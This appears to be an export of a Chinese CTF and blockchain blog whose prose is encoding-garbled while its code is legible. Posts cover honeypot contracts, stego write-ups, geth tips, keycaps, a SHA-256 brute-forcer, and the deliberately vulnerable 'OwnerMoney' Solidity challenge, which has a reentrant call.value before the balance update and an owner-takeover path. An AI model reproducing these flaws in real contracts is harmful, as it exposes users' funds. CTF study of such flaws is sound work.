    <content type="text"><![CDATA[å‰è¨€ çœ‹äº†èœœç½åˆçº¦çš„ä¸€äº›çŸ¥è¯†,æ„Ÿè§‰éžå¸¸æœ‰æ„æ€ èœœç½åˆçº¦çš„åˆ©ç”¨ç‚¹å¤§éƒ½å¾ˆå·§å¦™,ç›®çš„éƒ½æ˜¯ä¸ºäº†è¯±æƒ‘ä½ å‘åˆçº¦é‡Œé€é’± è¿™ç¯‡æ–‡ç« å°±ä¸å¯¹å“ªä¸ªèœœç½åˆçº¦å®žä¾‹åšå…·ä½“çš„åˆ†æžäº†,å¦‚æžœå¸¦ä½¬æƒ³çœ‹çš„è¯,å¯ä»¥å‚è€ƒåˆ†æžä¸€ä¸ªæœ‰è¶£çš„èœœç½åˆçº¦ å’Œ ä»¥å¤ªåŠèœœç½æ™ºèƒ½åˆçº¦åˆ†æž,è¿™é‡Œåªè®°å½•ä¸€ä¸‹è‡ªå·±çš„å¿ƒå¾— etherscan ä¸Šæœ‰ä¸€ä¸ªå¯è§äº¤æ˜“çš„æœºåˆ¶,åœ¨ etherscan ä¸Šå¯¹äºŽåˆçº¦ä¸Žåˆçº¦ç›´æŽ¥çš„æ¶ˆæ¯ä¼ é€,å½“ msg.value = 0 æ—¶å®ƒæ˜¯ä¸æ˜¾ç¤ºçš„,å› ä¸ºå®ƒä»¬è¢«è§†ä¸ºåˆçº¦é—´çš„ç›¸äº’è°ƒç”¨è€Œä¸æ˜¯ä¸€ç¬”äº¤æ˜“.æ‰€ä»¥å½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªåˆçº¦åœ°å€æ—¶,ç”¨ etherscan æŸ¥çœ‹è¯¥åˆçº¦åœ°å€çš„äº¤æ˜“å¹¶ä¸ä¸€å®šæ˜¯å…¨éƒ¨çš„äº¤æ˜“ä¿¡æ¯.ä½†çœ‹ä¸åˆ°çš„è¿™éƒ¨åˆ†ä¿¡æ¯å¯ä»¥é€šè¿‡ etherchain æ¥æŸ¥çœ‹,æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ etherchain ä¸åƒ etherscan è‡ªå¸¦ decode ,æ‰€ä»¥éœ€è¦å¯¹ Input æ‰‹åŠ¨è§£ç ,å¯ä»¥ä½¿ç”¨ abi-decoder å·¥å…· å¯¹äºŽèœœç½åˆçº¦,æ‰€æœ‰çš„äº¤æ˜“è®°å½•è¦è¯¦ç»†å®¡è®¡,å› ä¸ºåœ¨ä½ æ‹¿åˆ°åˆçº¦ä¹‹å‰,ä½ ä¸çŸ¥é“æ˜¯å¦æœ‰å…¶ä»–äºº(åŒ…æ‹¬åˆçº¦åˆ›å»ºè€…)å¯¹åˆçº¦è¿›è¡Œè¿‡æ“ä½œ èœœç½åˆçº¦ä¸€èˆ¬åªé€‚åˆåœ¨ä¸»é“¾ä¸Š,ä¸é€‚åˆ CTF å› ä¸ºèœœç½åˆçº¦ä¸€èˆ¬åªæ˜¯ä¸ºäº†â€œéª—é’±â€,è€Œåˆšå¼€å§‹çš„æ—¶å€™ä¼šå‘é‡Œé¢è½¬äº›é’±,è¯±ä½¿åˆ«äººå‘é‡Œé¢å……é’±,ç„¶åŽæŠŠé‡Œé¢çš„é’±æå‡ºæ¥,åœ¨æµ‹è¯•é“¾ä¸Š,è¿™äº›é’±æ˜¯æ— æ„ä¹‰çš„ è€Œä¸”å¦‚æžœä¸€æ—¦æœ‰äººè¯†ç ´çš„è¯,å°±ä¼šæœ‰äº¤æ˜“è®°å½•,å¦‚æžœæ˜¯åœ¨ CTF æ¯”èµ›é‡Œé¢,å…¶ä»–äººå°±ä¼šåˆ†æžäº¤æ˜“è®°å½•,å°±ä¼šå¾ˆå®¹æ˜“æ˜Žç™½èœœç½åˆçº¦äº†,è€Œä¸”ä¸€æ—¦æœ‰ä¸€ä¸ªäººåšå‡ºæ¥,é‡Œé¢çš„é’±å°±æ²¡äº†,å¤±åŽ»äº†èœœç½éª—é’±çš„æ„ä¹‰ ä»¥å¤ªåŠç¥žå¥‡æœºåˆ¶å¾ˆå¤š,å¯¹ä»¥å¤ªåŠæœ‰ä¸€å®šäº†è§£ä¹Ÿä¸è¦ç›²ç›®è‡ªä¿¡,ä¸å°å¿ƒå°±ä¼šæ ½è·Ÿå¤´,ç‰¢è®°å¤©ä¸Šä¸ä¼šç™½ç™½æŽ‰é¦…é¥¼,ä¸‰æ€è€ŒåŽè¡Œ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>èœœç½åˆçº¦</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DelCTF2020 mc_easybgm]]></title>
    <url>%2F2020%2FDelCTF2020-mc-easybgm%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¤çŽ° DelCTF2020 mc_easybgm é™„ä»¶ https://pan.baidu.com/s/178YHh19R5Pquoh74J4jODg å¯†ç : 7m3y Solutions é¢˜ç›®ç»™äº†æç¤º hint: easy stego,åº”è¯¥æ˜¯å’Œ mp3 éšå†™æœ‰å…³,æŒ‰ç…§å¸¸è§„æ€è·¯,æœ‰ä¸‰ç§æ€è·¯: ç›´æŽ¥æŸ¥æ‰¾ flag æŸ¥çœ‹è¯¥éŸ³é¢‘æ–‡ä»¶çš„æ³¢å½¢å›¾ã€é¢‘è°±å›¾ï¼Œæ˜¯å¦å­˜åœ¨ç›¸å…³ä¿¡æ¯å¯ä»¥è½¬åŒ–ä¸ºæ‘©æ–¯ç”µç  æŸ¥çœ‹ mp3 ä¸­æ˜¯å¦å«æœ‰éšè—æ–‡ä»¶ï¼Œæå–æ–‡ä»¶ å¯¹äºŽè¯¥é¢˜ç›®æ¥è¯´,éƒ½æ²¡æœ‰ä»€ä¹ˆç»“æžœ,æŸ¥é˜…åˆ° mp3 éŸ³é¢‘å¸§å­˜åœ¨å¸§å¤´ä¿¡æ¯,å¯å‚è€ƒå¦‚ä¸‹é“¾æŽ¥: https://blog.csdn.net/jeffchenbiao/article/details/7332863?%3E https://www.eefocus.com/lynn19861207/blog/10-03/187260_eae32.html å‘çŽ°å­˜åœ¨ä¿ç•™å­—ä½ private bit å¯æŽ§å†™å…¥ä¿¡æ¯,å› æ­¤,åªéœ€è¦æå–æ¯ä¸€ä¸ª mf ç»„ä¸­çš„è¯¥ä½,ç»„åˆèµ·æ¥,å°±æ˜¯ç­”æ¡ˆ å¯ä»¥ä»Žå›¾ä¸­çœ‹åˆ° ms å¼€å§‹ä½ä¸º 0x28A3 ,å³ç¬¬ 10403 å­—èŠ‚ 12345678910111213uint32 frame_sync : 12uint32 mpeg_id : 1uint32 layer_id : 2uint32 protection_bit : 1uint32 bitrate_index : 4uint32 frequency_index : 2uint32 padding_bit : 1uint32 private_bit : 1uint32 channel_mode : 2uint32 mode_extension : 2uint32 copyright : 1uint32 original : 1uint32 emphasis : 2 æ€»å…± 12+1+2+1+4+2+1+1+2+2+1+1+2=32 ,å³æ€»å…± 4 å­—èŠ‚, private_bit ä¸º 24 ,æ‰€åœ¨çš„å­—èŠ‚ä¸ºç¬¬ 3 ä¸ªå­—èŠ‚,å› æ­¤è¯¥å­—èŠ‚å¯¹åº”çš„åœ°å€ä¸º 10403+2=10405 è§‚å¯Ÿæ¯ä¸€ä¸ª mf ç»„,å¤§å°éƒ½ä¸º 0x1A1 , å³ 417 å­—èŠ‚ å¯é€šè¿‡å†™è„šæœ¬è§£å†³,å¦‚ä¸‹: 12345678910111213import reimport binasciin = 10405result = ''fina = ''file = open('C:/Users/lenovo/Desktop/bgm.mp3','rb')while n &lt; 1369844 : file.seek(n,0) n += 417 file_read_result = file.read(1) read_content = bin(ord(file_read_result))[-1] result = result + read_contentprint result è¾“å‡ºå¦‚ä¸‹: 1101111101000010010101110011010101000001001010110110011000010001011111010001000101000110001001110000011001110101011111010001011100110001000101100010010101100001011001100111011001001011010110010111110100000110000101110111110101100110010110110000011001100011010001100110011001110101011011110011000100010101011000010100011001010011000100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 åŽé¢ä¸€å † 0 ä¸²éƒ½ä¸è¦,åªä¿ç•™åˆ° 8 çš„å€æ•°åˆšå¥½å®Œæˆ,åŽé¢çš„ 0 å…¨éƒ¨èˆå¼ƒï¼ŒåŒæ—¶å°†ä¿ç•™çš„æ•°æ®åè½¬ï¼Œå¹¶ä¸” 8 ä¸ªä¸€ç»„åˆ†å‰²å¼€ï¼Œè½¬æˆå­—ç¬¦ä¸²å³å¯ 123456789import refina = ''result = '010001000110010100110001010000110101010001000110011110110101011100110011001100010110001100110000011011010011001101011111011101000011000001011111010011010110100100110111001100110100001101010010001101000100011001110100010111110101011100110000011100100011000101000100010111110100010000110011011010100100000101010110011101010010000101111101'textArr = re.findall('.&#123;'+str(8)+'&#125;', result)# textArr.append(result[(len(textArr)*8):])for i in textArr: fina = fina + chr(int(i,2)).strip('\n')print fina æœ€åŽè¾“å‡ºå¦‚ä¸‹: å‚è€ƒ å‚è€ƒhttps://l1near.top/index.php/2020/05/06/52.htmlhttps://www.cnpanda.net/ctf/342.html]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>DelCTF2020</tag>
        <tag>mc_easybgm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NPUCTF2020 ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹ï¼]]></title>
    <url>%2F2020%2FNPUCTF2020-rainbow%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¤çŽ° NPUCTF2020 ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹ï¼ é™„ä»¶ https://pan.baidu.com/s/1Ok_xleNJ_VDqVYUnYpWIJQ å¯†ç : ijdv Solutions ä¸‹è½½é™„ä»¶å¹¶è§£åŽ‹,æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼šlookatme.txtã€maybehint.txt å’Œ secret æ‰“å¼€ lookatme.txt å‘çŽ°æ–‡ä»¶æ˜¯ä¸€ä¸²æ•°å­—ï¼Œå…¨é€‰ä»¥åŽå‘çŽ°æœ€ä¸‹æ–¹æœ‰å‡ ä¸ªç©ºæ ¼å’ŒTABæ¢è¡Œç»„æˆçš„ç©ºã€‚è”æƒ³åˆ°æ˜¯æ‘©æ–¯å¯†ç ï¼Œç©ºæ ¼ = .ï¼ŒTAB = - ç¿»è¯‘å‡ºæ¥çš„æ‘©æ–¯å¯†ç æ˜¯ï¼š.- ..- - --- -.- . -.-- ,è§£å¯†å¾—åˆ°å¯†æ–‡ autokey ,æ ¹æ®è§£å‡ºæ¥çš„å¯†æ–‡å¯ä»¥åˆ¤æ–­ä¸Šé¢çš„å­—ç¬¦ä¸²ç»è¿‡äº† autokey åŠ å¯† å†çœ‹ä¸€ä¸‹ maybehint.txt ,æç¤ºåœ¨txtä¸­éšè—äº†ä¸€äº›ä¸œâ»„,ç”¨ vim æŸ¥çœ‹ å¾ˆæ˜Žæ˜¾ä¸ºé›¶å®½åº¦å­—ç¬¦éšå†™ï¼Œä¸”ç”±ã€ã€è¿™ä¸‰ç§å­—ç¬¦ç»„æˆ, åŽ»æ­¤ç½‘ç«™è§£å¯†,å¾—åˆ° do u know NTFS? å¦‚ä¸‹å›¾ ç”¨ ntfsstreamseditor æå–å¦‚ä¸‹ ç¨åŠ è§‚å¯Ÿå¯ä»¥å‘çŽ°å…¶ä¸­åªæœ‰å‡ ç§å­—ç¬¦ï¼Œè€Œä¸”éƒ½ä¸ºé‡å¤çš„ï¼Œæ®æ­¤å¯ä»¥å°è¯•è¯é¢‘åˆ†æž 1234from collections import Counterf=open('out.txt','r')f_read=f.read()print Counter(f_read) å¾—åˆ°ç»“æžœä¸ºè¿™å‡ ç§å­—ç¬¦ä»Žå¤šåˆ°å°‘çš„æŽ’åˆ—é¡ºåºï¼Œç»„åˆåœ¨ä¸€èµ·å¾—åˆ° ZW5jcnlwdG8= , base64 è§£å¯†å¾—åˆ° encrypto ,ç™¾åº¦ encrypto å¯çŸ¥å…¶æ˜¯ä¸€ä¸ªåŠ å¯†è½¯ä»¶ï¼Œä¸‹è½½åŽå°è¯•ç”¨å…¶åŠ å¯†ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å¾—çŸ¥ç»è¿‡å…¶åŠ å¯†çš„æ–‡ä»¶åŽç¼€åä¸º cryptoï¼Œå°† secret æ–‡ä»¶åŽç¼€åæ”¹ä¸º secret.crypto å³å¯æ‰“å¼€æ–‡ä»¶ å¯ä»¥çœ‹åˆ°æ–‡ä»¶è¢«åŠ å¯†ï¼Œæƒ³åˆ° autokeyï¼Œä½†æ˜¯ç”±äºŽæ²¡æœ‰ç»™å‡ºåŠ å¯†å¯†é’¥ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œ çˆ†ç ´ï¼Œå‚è€ƒ æ­¤ç½‘å€,å½“ç„¶,åœ¨ break_autokey ä¹Ÿå‡†å¤‡å¥½äº†,è¿è¡Œç»“æžœå¦‚ä¸‹å›¾ ç»“åˆ hint å°å†™, å¯†ç ä¸º iamthepasswd å¯æ˜¯ç”¨æ­¤å¯†ç è§£è¿™ä¸ªåŠ å¯†æ–‡ä»¶æ—¶å´ä¸€ç›´è§£ä¸å¼€ï¼Œå†ç»“åˆé¢˜ç›®æè¿°ä¸­åŠ ç²—çš„æ‹¬å·åˆ æŽ‰ï¼ŒæŽ¨ æµ‹æ˜¯å¦åœ¨æ–‡ä»¶ä¸­è¿˜éšè—äº†ä»€ä¹ˆä¿¡æ¯ï¼Œç”¨ strings å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶å¯ä»¥å‘çŽ°è¿™æ ·ä¸€æ¡ä¿¡æ¯ 1(Oh!Youcaughtme!But...) å°†å…¶åˆ åŽ»åŽå†æ¬¡å°è¯•è§£å¯†ï¼Œå³å¯æˆåŠŸè§£å¯†,è§£å¯†åŽå¾—åˆ°ä¸€å¼  å½©è™¹.png å›¾ç‰‡, binwalk æŸ¥çœ‹æœ‰ä¸ªåŽ‹ç¼©åŒ…, ç”¨ foremost åˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†åŽ‹ç¼©åŒ…,æ‰€ä»¥çŽ°åœ¨éœ€è¦å¯»æ‰¾å¯†ç  ä»”ç»†è§‚å¯Ÿå›¾ç‰‡å¯ä»¥å‘çŽ°ï¼Œç”±äº”ç§ä¸åŒé¢œè‰²çš„æ¨ªæ¡åˆ†éš”å¼€çš„å…­å—â»©è‰²æœ‰ç•¥å¾®æ·±æµ…çš„å·®å¼‚ï¼Œ ç”¨ gimp æˆ– ps æ‰“å¼€æå–ä¸€ä¸‹é¢œè‰² åˆ†åˆ«æå–ä¸€ä¸‹å…­ç§â»©è‰²ï¼Œå¯ä»¥å‘çŽ°ä»–ä»¬é¢œè‰²çš„ HTMLæ ‡è®° åªæœ‰æœ€åŽä¸¤ä½ä¸åŒï¼Œä»Žä¸Šåˆ°ä¸‹ ä¾æ¬¡ä¸º70ã€40ã€73ã€73ã€57ã€64ï¼Œå°†è¿™å‡ ä¸ªæ•°ç»„åˆåœ¨ä¸€èµ·ï¼Œç”¨ Converter çš„ Hex to Text ï¼Œæˆ–è€… python çš„ decode(&#39;hex&#39;) ï¼Œå°±å¯ä»¥å¾—åˆ°è§£åŽ‹å¯†ç  è§£åŽ‹åŽå¾—åˆ° docx æ–‡ä»¶ï¼Œæƒ³åˆ° word éšå†™ï¼Œæ˜¾ç¤ºéšè—æ–‡å­— ä»”ç»†è§‚å¯Ÿä¸Šé¢çš„ä¸€â»“ä¸²å­—æ¯ï¼Œå¯ä»¥åœ¨ä¼—å¤šçš„å°å†™å­—æ¯ä¸­å‘çŽ°å‡ ä¸ªå¤§å†™å­—æ¯,æŒ‰ç…§é¡ºåºç»„åˆèµ·æ¥å¾—åˆ° ALPHUCK, æŸ¥é˜…å¯çŸ¥æ˜¯ä¸€ç§ Programming Language ,åªç”± a,c,e,i,j,o,p,s è¿™ 8 ä¸ªå°å†™å­—æ¯ç»„æˆï¼Œæ‰€ä»¥åˆ åŽ»ä¸Šé¢çš„å‡ ä¸ªå¤§å†™å­—æ¯ï¼Œåœ¨çº¿ç½‘ç«™è§£ç ä¸€ä¸‹å³å¯å¾—åˆ° flag]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>npuctf2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs ç›‘å¬ç§æœ‰é“¾pendingäº¤æ˜“å¹¶è‡ªåŠ¨miner]]></title>
    <url>%2F2020%2Fauto-pending-miner%2F</url>
    <content type="text"><![CDATA[å‰è¨€nodejs ç›‘å¬ç§æœ‰é“¾ pending äº¤æ˜“å¹¶è‡ªåŠ¨ miner 123456789101112131415161718192021222324252627const Web3 = require('web3')var web3 = new Web3()//web3 = new Web3(new Web3.providers.IpcProvider('', ipcProviderWrapper))const web3Admin = require('./web3admin.js')web3.setProvider(new web3.providers.HttpProvider('http://localhost:8548'))web3Admin.extend(web3)function sleep(millis) &#123; return new Promise(function (resolve, reject) &#123; setTimeout(function () &#123; resolve(); &#125;, millis); &#125;);&#125;async function main()&#123; while(1)&#123; if(web3.txpool.status['pending']==1)&#123; console.log("turning off mining", web3.miner.start()); console.log("isMining?", web3.eth.mining); &#125;else&#123; console.log("turning off mining", web3.miner.stop()); console.log("isMining?", web3.eth.mining); await sleep(10000); &#125; &#125;&#125;main()]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[geth --rpcaddr]]></title>
    <url>%2F2020%2Fprivate%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æœ€è¿‘åœ¨å†…ç½‘çŽ¯å¢ƒä¸‹å‡ºåŒºå—é“¾çš„é¢˜ç›®ï¼Œå› ä¸ºæ˜¯å†…ç½‘ï¼Œæ‰€ä»¥è€ƒè™‘è‡ªå·±æ­å»ºç§é“¾ï¼Œå› ä¸ºè€ƒè™‘å†…ç½‘çŽ¯å¢ƒ flag çš„å‘é€é—®é¢˜ï¼Œæ‰€ä»¥ä½¿ç”¨ web3.py + django + nginx çš„å½¢å¼ è®°å½•ä¸€ä¸‹ä½¿ç”¨ geth æ­å»ºç§é“¾çš„å‘ éšä¾¿å†™ä¸€å†™ï¼Œæƒ³åˆ°å“ªå†™åˆ°å“ª å¯åŠ¨ç§æœ‰é“¾çš„æ—¶å€™è¦æ³¨æ„ --rpcaddr é€‰é¡¹ rpcaddr é»˜è®¤æ˜¯ localhost ï¼Œå¦‚æžœæ²¡æœ‰æ˜Žç¡®æŒ‡å®š ip ,é‚£ä¹ˆ geth attach é€šè¿‡ TCP è¿žæŽ¥åªèƒ½æ˜¯ geth attach http://localhost:port å¦‚æžœ rpcaddr æ˜Žç¡®æŒ‡å®šäº† ip ï¼Œé‚£ä¹ˆå³ä½¿åœ¨æœ¬åœ°ä¸»æœºï¼Œä¹Ÿæ— æ³•é€šè¿‡ Web3.HTTPProvider(&#39;http://localhost:8545&#39;) è¿žæŽ¥ï¼Œè¢«è¿™ä¸ªå‘äº†ä¸¤ä¸ªå¤šå°æ—¶ï¼Œä¸€å¼€å§‹ä¸€ç›´æ˜¯ requests.exceptions.ConnectionError çš„é”™è¯¯ï¼Œå¤´çš®å‘éº»ï¼ŒåŽæ¥é™ä¸‹å¿ƒæ¥ä»”ç»†æƒ³äº†ä¸€ä¸‹ï¼Œæ‰æƒ³åˆ°æ˜¯è¿™ä¸ªåŽŸå› ï¼Œåšä¸ªç¬”è®°é•¿ä¸ªè®°æ€§]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æœºæ¢°é”®ç›˜-é”®å¸½]]></title>
    <url>%2F2020%2Fkeyboard%2F</url>
    <content type="text"><![CDATA[å‰è¨€ è®°å½•æ¯ä¸ªé˜¶æ®µæƒ³è¦è®°å½•çš„ä¸œè¥¿ å…¥äº†æœºæ¢°é”®ç›˜çš„å‘â€¦â€¦ å¥½çœ‹çš„é”®å¸½ éšæ„å†™ä¸€å†™â€¦â€¦ é”®å¸½ é”®å¸½é«˜åº¦ å¸¸è§é”®å¸½é«˜åº¦æŒ‰ä»Žé«˜åˆ°ä½ŽæŽ’åˆ—ä¸ºï¼šOEM(ä»£å·¥åŽ‚) - SP - Cherry(åŽŸåŽ‚) çƒå¸½åˆ†ä¸º SA - DSA ï¼ŒDSA é«˜åº¦ä»Žä¾§é¢çœ‹æ²¡æœ‰æ˜Žæ˜¾çš„äººä½“å·¥ç¨‹å­¦æ›²çº¿ï¼Œ SA åˆ™æœ‰ç¬¦åˆäººä½“å·¥ç¨‹å­¦çš„æ›²çº¿ã€‚ é”®å¸½æè´¨ï¼šä¸»è¦åˆ†ä¸º ABS ã€PBT ã€POM ä¸‰ç§ ä½¿ç”¨è¾ƒå¤šçš„æ˜¯ ABS å’Œ PBT å…·ä½“ç»†èŠ‚åŽŸç†æˆ‘å°±æ²¡æœ‰åŽ»äº†è§£ï¼ŒåªçŸ¥é“æ‰‹æ„Ÿå¥½ï¼Œä½†å®¹æ˜“æ‰“æ²¹ï¼Œæœ€å¥½è¿˜æ˜¯é€‰ç”¨ PBT çƒ­å‡åŽæˆ–è€…äºŒè‰²æˆåž‹ å¥½çœ‹çš„é”®å¸½ åªæ˜¯ä¸ªäººè®¤ä¸ºå¥½çœ‹çš„ï¼Œå‹¿å–·233333 å¥¶ç“¶æŸ¯åŸºæ˜¯ 2020-03-22 æ™šä¸Š 20:00 å¼€å”®ï¼Œé™é‡ 130 å¥— æŽ’éª¨ç”µè€—å­ æŽ’éª¨æŸ´çŠ¬ å¥¶ç“¶æŸ¯åŸºé»„ å¥¶ç“¶æŸ¯åŸºç²‰ å¥¶ç“¶é¾™çŒ« å¥¶ç“¶é¾™çŒ« å¥¶ç“¶ç”µçŽ©]]></content>
      <categories>
        <category>Keyboard</category>
      </categories>
      <tags>
        <tag>Keyboadrd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sha256(py2 vs py3)]]></title>
    <url>%2F2020%2Fsha256%2F</url>
    <content type="text"><![CDATA[å‰è¨€sha256 å·¥ä½œé‡è¯æ˜Žï¼Œpython2 å’Œ python3 çš„ä¸åŒ python2123456789101112131415def sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update(prefix.encode() + iteration) bits = ''.join(bin(int(i, 16))[2:].zfill(4) for i in h.hexdigest()) print iteration, bits[:18] if bits[:18] == "0"*18: print "The password is: " + iteration return iteration python31234567891011121314151617import hashlib,itertoolsdef sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update((prefix + iteration).encode()) bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest()) print(iteration, bits[:18]) if bits[:18] == "0"*18: print("The password is: " + iteration) return iteration]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>Python2</tag>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OwnerMoney]]></title>
    <url>%2F2020%2FOwnerMoney%2F</url>
    <content type="text"><![CDATA[å‰è¨€ é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›åŒºå—é“¾ OwnerMoney é¢˜ç›® ä»¥å¤ªåŠ Ropsten æµ‹è¯•é“¾ åˆçº¦åœ°å€ï¼šhttps://ropsten.etherscan.io/address/0x40a590b70790930ceed4d148bf365eea9e8b35f4 é¢˜ç›®ï¼šé™„ä»¶ä¸‹è½½ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115pragma solidity ^0.4.23;interface Changing &#123; function isOwner(address) view public returns (bool);&#125;contract OwnerMoney &#123; address private owner; address private backup; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; bool) public status; mapping(address =&gt; uint) public buyTimes; constructor() &#123; owner = msg.sender; backup = msg.sender; &#125; event pikapika_SendFlag(string b64email); modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; function payforflag(string b64email) onlyOwner public &#123; require(buyTimes[msg.sender] &gt;= 100); _init(); buyTimes[msg.sender] = 0; address(0x4cfbdFE01DAEF460B925773754821E7461750923).transfer(address(this).balance); emit pikapika_SendFlag(b64email); &#125; function _init() internal &#123; owner = backup; &#125; function change(address _owner) public &#123; Changing tmp = Changing(msg.sender); if(!tmp.isOwner(_owner))&#123; status[msg.sender] = tmp.isOwner(_owner); &#125; &#125; function change_Owner() &#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); if(status[msg.sender] == true)&#123; status[msg.sender] = false; owner = msg.sender; &#125; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function buy() payable public returns (bool success)&#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); require(buyTimes[msg.sender]==0); require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); balanceOf[msg.sender] = 100; buyTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 200); require(buyTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); buyTimes[msg.sender] -= 1; return true; &#125; function balance0f(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; Analyse æŸ¥çœ‹ payforflag ï¼Œæˆ‘ä»¬éœ€è¦æˆä¸º owner ï¼ŒåŒæ—¶ buyTimes[msg.sender] &gt;= 100 æƒ³è¦æˆä¸º owner ï¼Œå¯ä»¥é€šè¿‡ change_owner å‡½æ•°å®žçŽ° change_owner å‡½æ•°è¦æ±‚å¿…é¡»é€šè¿‡åˆçº¦è°ƒç”¨ï¼Œè€Œä¸æ˜¯å¤–éƒ¨è´¦æˆ·è°ƒç”¨ï¼ŒåŒæ—¶è¦æ±‚åˆçº¦åœ°å€æœ€åŽä¸‰ä½æ˜¯ 0xfff ï¼Œå¯ä»¥å‚è€ƒ https://hitcxy.com/2020/generate-address/ status[msg.sender] è¦æ±‚ä¸º true ï¼šå¯ä»¥é€šè¿‡ change(address _owner) è§£å†³ï¼ŒChanging æŽ¥å£ä¸­å£°æ˜Žäº† isOwner å‡½æ•°ï¼Œç”¨æˆ·å¯è‡ªè¡Œç¼–å†™ï¼Œè¦ä½¿ status[msg.sender] = true ï¼Œåˆ™ tmp.isOwner(_owner) ç¬¬ä¸€æ¬¡è°ƒç”¨éœ€è¿”å›ž false ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨è¿”å›ž true 